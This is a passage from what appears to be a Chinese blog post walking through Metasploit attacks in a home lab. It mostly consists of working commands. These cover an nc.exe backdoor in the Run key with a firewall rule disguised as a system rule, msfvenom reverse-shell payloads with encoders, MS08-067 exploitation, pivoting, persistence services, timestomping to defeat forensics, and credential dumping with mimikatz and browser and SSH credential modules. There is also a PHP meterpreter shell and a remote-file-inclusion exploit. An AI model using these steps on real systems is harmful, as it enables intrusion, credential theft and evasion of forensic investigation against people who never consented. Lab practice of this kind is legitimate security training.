&#x27;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#x27;</span><br><span class="line"></span><br><span class="line">再次查看</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</span><br><span class="line"></span><br><span class="line">打开一个隐式shell，并查看防火墙</span><br><span class="line">execute -f cmd -i -H</span><br><span class="line">netsh firewall show opmode</span><br><span class="line"></span><br><span class="line">如果开启则添加放行策略</span><br><span class="line">netsh firewall add portopening TCP 444 &quot;Core Networking - DNS (UDP-Out) - fjy&quot; ENABLE ALL</span><br><span class="line">(Core Networking - DNS (UDP-Out)为系统自带规则用于伪装)</span><br><span class="line"></span><br><span class="line">重启</span><br><span class="line">shutdown -r -t 0</span><br><span class="line"></span><br><span class="line">连接</span><br><span class="line">nc 192.168.1.200 444</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705201304290.png"> <img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705202016725.png"><h3 id="案例三、抓包"><a href="#案例三、抓包" class="headerlink" title="案例三、抓包"></a>案例三、抓包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在获取到meterpreter shell的情况下</span><br><span class="line">meterpreter &gt; load sniffer    # 导入sniffer</span><br><span class="line">meterpreter &gt; sniffer_start 3 # 选择网卡进行抓包，抓包方法为在内存中缓存区块循环存储抓包，默认50000个包，不写硬盘中，并且智能过滤meterpreter流量，传输过程使用SSL/TLS加密。</span><br><span class="line">sniffer_dump 3 text.cap # 下载抓到的包</span><br><span class="line"></span><br><span class="line">抓到的包可以使用wireshark进行分析，也可以使用MSF自带解码进行解码</span><br><span class="line">use auxiliary/sniffer/psnuffle</span><br><span class="line">set PCAPFILE text.cap</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121725585.png"><p>可以看到用户名与密码</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121809730.png"><h3 id="案例四、文件搜索"><a href="#案例四、文件搜索" class="headerlink" title="案例四、文件搜索"></a>案例四、文件搜索</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f *.ini</span><br><span class="line">search -d C:\\Users\ and\ settings\\administrator\\desktop\\ -f *.docx</span><br></pre></td></tr></table></figure><h3 id="案例五、时间取证分析"><a href="#案例五、时间取证分析" class="headerlink" title="案例五、时间取证分析"></a>案例五、时间取证分析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">文件系统访问会留下痕迹，电子取证重点关注。</span><br><span class="line">渗透测试者与攻击者往往希望销毁文件系统的访问痕迹。</span><br><span class="line">最好的避免被文件取证就是不要触碰文件系统。</span><br><span class="line">meterpreter的优势在于完全基于内存。</span><br><span class="line">MAC 时间（Modified / Accessed / Changed）</span><br><span class="line">M为文件修改时间，A为文件的访问时间，C为文件权限的修改时间</span><br><span class="line"></span><br><span class="line">在系统下修改时间：</span><br><span class="line">ls -l --time=atime/ctime 1.txt # 默认为mtime</span><br><span class="line">stat 1.txt # 列出全部时间</span><br><span class="line">touch -d &quot;2 days ago&quot; 1.txt # 修改MA时间</span><br><span class="line">touch -t 1501010101 1.txt # 修改精确时间，年月日</span><br><span class="line"></span><br><span class="line">在meterpreter下修改时间：</span><br><span class="line">meterpreter &gt; timestomp -v 111 # 查看111文件的MAC时间</span><br><span class="line">timestomp -f C:\\WINDOWS\\0.log 111 # -f为指定一个模板，将111的时间改为0.log的时间</span><br><span class="line"></span><br><span class="line">timestomp -a &quot;11/11/2018 11:11:11&quot; 111 # 指定修改A的时间</span><br><span class="line">timestomp -m &quot;11/11/2018 11:11:11&quot; 111 # 指定修改M的时间</span><br><span class="line">timestomp -c &quot;11/11/2018 11:11:11&quot; 111 # 指定修改M的时间</span><br><span class="line">timestomp -z &quot;11/11/2024 11:11:11&quot; 111 # 一次修改三个时间</span><br><span class="line">timestomp -e &quot;11/11/2020 11:11:11&quot; 111 # 指定修改E(Entry Modified)时间</span><br><span class="line">Entry Modified为MFT，为NTFS的文件系统的主文件分配表</span><br><span class="line">-b -r 为擦除MACE时间表，目前已失效。</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706141936093.png"><h3 id="案例六、使用Pivoting（基于路由）实现跳板-枢纽-支点get-shell"><a href="#案例六、使用Pivoting（基于路由）实现跳板-枢纽-支点get-shell" class="headerlink" title="案例六、使用Pivoting（基于路由）实现跳板/枢纽/支点get shell"></a>案例六、使用Pivoting（基于路由）实现跳板/枢纽/支点get shell</h3><h4 id="1-实验拓扑"><a href="#1-实验拓扑" class="headerlink" title="1.实验拓扑"></a>1.实验拓扑</h4><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707152622464.png"><h4 id="2-实验目的"><a href="#2-实验目的" class="headerlink" title="2.实验目的"></a>2.实验目的</h4><blockquote><p>1.kali使用msf生成名为haha.exe的执行程序，并诱使win_2k03执行，然后反弹给kali一个meterpreter shell。</p><p>2.得到shell后以win_2k03为跳板，控制win_XP。</p></blockquote><h4 id="3-实验过程"><a href="#3-实验过程" class="headerlink" title="3.实验过程"></a>3.实验过程</h4><p>1.配置防火墙m0n01，配置NAT</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153518682.png"><p>2.配置WLAN关闭拒绝私有网段访问，使访问其他主机访问192.168.1.4能够实现NAT。</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153857414.png"><p>3.配置m0n02规则，允许全部网段可以出去</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155315502.png"><p>4.测试</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155229810.png"><p>5.生成haha.exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o haha.exe</span><br></pre></td></tr></table></figure><p>6.win_2k03下载并访问（诱骗）</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155813729.png"><p>7.kali监听，win_2k03运行haha.exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.253.22  # 这里不是192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707160150775.png"><p>8.添加到达192.168.254.0的路由，使以后192.168.254.0的路由都走session1</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707162846401.png"><p>9.扫描网段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.254.20-192.168.254.30</span><br><span class="line">set ports 139,445</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>可以看到20与22是存活的</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707163857984.png"><p>10.使用nmap扫描，可以看到添加的路由对nmap没有作用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap -A -p 445 -Pn 192.168.254.22</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707164742663.png"><p>11.利用ms08067 get XP shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set rhosts 192.168.254.22</span><br><span class="line">set target 34</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>这里win2k03挂了，所以我换了个win7，但出现了个问题。弹出了一个消息点击允许就可以得到shell，但我失败了。。。</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707214348635.png"><p>来baby让我们换个思路，竟然反弹给win2k03失败，那么能不能反弹给他的上一级m0n0的wlan口，理论上是可以，因为我们已经加了一条192.168.254.0/24的路由，并且网关为session9，尝试一下是可以的。</p><p>这里在连接win2k03的session中一定要加192.168.254.0/24的路由</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221947516.png"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>已经拿到win_XP的shell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221620618.png"> <img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222926242.png"><p>两个shell都拿到手了。</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221906308.png"><p>那么这种情况下的shell并不是从win2k03拿到的，如下图，而是由session 9建立连接，发送XP payload，执行后直接反弹给m0n0的wlan口，并不经过win2k03。</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707223402391.png"><p>再看一下win2k03（win7）</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222635457.png"><p>综上，实验完成。</p><h3 id="案例七、使用Pivoting（基于端口转发）实现跳板-枢纽-支点get-shell"><a href="#案例七、使用Pivoting（基于端口转发）实现跳板-枢纽-支点get-shell" class="headerlink" title="案例七、使用Pivoting（基于端口转发）实现跳板/枢纽/支点get shell"></a>案例七、使用Pivoting（基于端口转发）实现跳板/枢纽/支点get shell</h3><p>删除session 9 的路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 192.168.254.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224245019.png"><p>添加一个端口映射</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 192.168.253.22 -l 3389 -r 192.168.254.22 -p 3389</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224822057.png"><p>执行，拿到shell。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# rdesktop 192.168.253.22</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225206502.png"><p>登入xp会弹警告</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225911526.png"> <img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230006676.png"><p>kali连接上的时候xp用户会注销</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230225787.png"> <img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230115548.png"><p>完。。。</p><h3 id="案例八，多sessions连接"><a href="#案例八，多sessions连接" class="headerlink" title="案例八，多sessions连接"></a>案例八，多sessions连接</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o a.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.4</span><br><span class="line">set exitonsession # 持续监听4444端口，能够同时获取多个session</span><br><span class="line">run -j -z</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709110800149.png"><p>使用post模块进行后渗透测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24 #扫描整个网段</span><br><span class="line">run post/windows/gather/checkvm # 扫描虚拟机</span><br><span class="line">run post/windows/gather/credentials/credential_collector #　扫描身份验证信息(账号)token</span><br><span class="line">run post/windows/gather/enum_applications # 扫描安装软件的信息</span><br><span class="line">run post/windows/gather/enum_logged_on_users # 扫描正处于登入的账号(500为管理员)</span><br><span class="line">run post/windows/gather/enum_snmp # 查看snmp相关配置</span><br><span class="line">run post/multi/recon/local_exploit_suggester # 扫描本地可以用于提权的漏洞模块</span><br><span class="line">run post/windows/manage/delete_user USERNAME=a # 删除用户</span><br><span class="line">run post/multi/gather/env # 查看系统环境信息</span><br><span class="line">run post/multi/gather/firefox_creds # 查看火狐浏览器保存的密码</span><br><span class="line">run post/multi/gather/ssh_creds # 查看本地保存的ssh用户名密码信息</span><br><span class="line">run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe # 检查目标系统文件是否为恶意文件</span><br><span class="line">run hostsedit -e 192.168.1.4,www.baidu.com # 修改hosts文件</span><br></pre></td></tr></table></figure><p>设置制动执行脚本，使得到的session进程为explorer</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; set AutorunScript migrate -n explorer.exe</span><br><span class="line">run -j -z</span><br><span class="line"></span><br><span class="line">set InitialAutoRunScript migrate -n explorer.exe</span><br><span class="line">set AutoRunScript post/windows/gather/dumplinks</span><br></pre></td></tr></table></figure><h3 id="案例九，建立持久连接"><a href="#案例九，建立持久连接" class="headerlink" title="案例九，建立持久连接"></a>案例九，建立持久连接</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A # 在目标机器创建一个系统服务并启动</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150301191.png"> <img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150337750.png"> <img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150449642.png"><p>连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set rhost  192.168.1.200</span><br><span class="line">set lport 31337</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>其他方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -X -r 192.168.1.200 -p 4444 -i 10 # 当XP重启时会重新连接</span><br></pre></td></tr></table></figure><p>重启XP直连</p><h3 id="案例十，MSF延展Mimikatz"><a href="#案例十，MSF延展Mimikatz" class="headerlink" title="案例十，MSF延展Mimikatz"></a>案例十，MSF延展Mimikatz</h3><p>hashdump就是使用mimikatz的部分功能</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">导入</span><br><span class="line">load mimikatz</span><br><span class="line">msv # 查看系统用户信息（hash）</span><br><span class="line">ssp # 查看用户明文信息</span><br><span class="line">tspkg # 票据</span><br><span class="line">wdigest # 可以查看到内存中存在的用户名密码</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709161910259.png"><p>参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">load mimikatz</span><br><span class="line">wdigest ̵kerberos ̵msv ̵ssp ̵tspkg ̵livessp</span><br><span class="line">mimikatz_command -h</span><br><span class="line">mimikatz_command -f a::  # 查看哪些模块可以使用</span><br><span class="line">mimikatz_command -f samdump::hashes  # </span><br><span class="line">mimikatz_command -f handle::list  # 查看系统进程</span><br><span class="line">mimikatz_command -f service::list # 查看系统服务，可以开启服务也可以停止服务</span><br><span class="line">mimikatz_command -f crypto::listProviders  # 查看支持的加密套件</span><br><span class="line">mimikatz_command -f winmine::infos # 破解扫雷游戏。。。</span><br></pre></td></tr></table></figure><h3 id="案例十一，PHP-shell"><a href="#案例十一，PHP-shell" class="headerlink" title="案例十一，PHP shell"></a>案例十一，PHP shell</h3><p>通过浏览器访问执行php文件拿到shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=3333 -f</span><br><span class="line">raw -o a.php</span><br><span class="line"></span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>浏览器访问</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165542747.png"><p>getshell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165601746.png"><h3 id="案例十二，RFI"><a href="#案例十二，RFI" class="headerlink" title="案例十二，RFI"></a>案例十二，RFI</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">修改PHP配置文件，允许远程包含</span><br><span class="line">vi /etc/php5/cgi/php.ini #php info 配置文件</span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">MSF：</span><br><span class="line">use exploit/unix/webapp/php_include</span><br><span class="line">set RHOST 192.168.1.5</span><br><span class="line">set PATH /dvwa/vulnerabilities/fi/</span><br><span class="line">set PHPURI /?page=XXpathXX  # 不管什么都填XXpathXX</span><br><span class="line">set HEADERS &quot;Cookie:security=low;PHPSESSID=r0p9hepkbrkcn01jjjqldsork2&quot;</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200711150428027.png"></div><div><div><div style="text-align:center;color:#000;font-size:20px">-------------纸短情长<i class="fa fa-paw"></i>下次再见-------------</div></div></div><div class="reward-container"><div>加个赞赏，万一有好心人呢~</div><button onclick='document.querySelector(".post-reward").classList.toggle("active")'>谢谢你请我吃辣条!</button><div class="post-reward"><div><img src="/images/wechatpay.jpg" alt="Lluna 微信"> <span>微信</span></div><div><img src="/images/alipay.jpg" alt="Lluna 支付宝"> <span>支付宝</span></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>Lluna</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/" title="MSF的简单操作">https://lunamoore.github.io/2020/08/18/MSF的简单操作/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请标注链接及作者！</li></ul></div><div class="followme"><span>欢迎关注我的公众号</span><div class="social-list"><div class="social-item"><a target="_blank" class="social-link" href="/images/gzh.jpg"><span class="icon"><i class="fab fa-weixin"></i> </span><span class="label">WeChat</span></a></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/security-tools/" rel="tag"><i class="fa fa-tag"></i> security tools</a> <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/" rel="prev" title="Veil-Evasion安装"><i class="fa fa-chevron-left"></i> Veil-Evasion安装</a></div><div class="post-nav-item"><a href="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/" rel="next" title="HackTheBox注册">HackTheBox注册 <i class="fa fa-chevron-right"></i></a></div></div></footer></article><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; 2020 – <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">Lluna</span></div><div class="wordcount"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-chart-line"></i> </span><span>站点总字数：</span> <span title="站点总字数">559k</span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span>站点阅读时长 &asymp;</span> <span title="站点阅读时长">8:28</span></span></div><span id="sitetime"></span><script language="javascript">function siteTime(){window.setTimeout("siteTime()",1e3);var e=36e5,t=24*e,o=new Date,i=o.getFullYear(),a=o.getMonth()+1,n=o.getDate(),r=o.getHours(),l=o.getMinutes(),s=o.getSeconds(),M=Date.UTC(2020,8,14,15,0,0),g=Date.UTC(i,a,n,r,l,s)-M,m=Math.floor(g/31536e6),T=Math.floor(g/t-365*m),f=Math.floor((g-(365*m+T)*t)/e),h=Math.floor((g-(365*m+T)*t-f*e)/6e4),u=Math.floor((g-(365*m+T)*t-f*e-6e4*h)/1e3);document.getElementById("sitetime").innerHTML="小站已运行"+T+" 天 "+f+" 小时 "+h+" 分钟 "+u+" 秒"}siteTime()</script><div class="busuanzi-count"><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div><script color="0,0,0" opacity="0.7" zindex="-1" count="300" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({
      el  : '#valine-comments',
      path: location.pathname,
    }, {"enable":true,"appId":"8hPlmJu758GqGb8p9gI7IWIH-gzGzoHsz","appKey":"EBvPjdspqOEm800591erwHwx","placeholder":"ヾﾉ≧∀≦)o来了老弟!","avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":null,"visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
    ));
  }, window.Valine);
});</script><script type="text/javascript" src="/js/love.js"></script></body></html>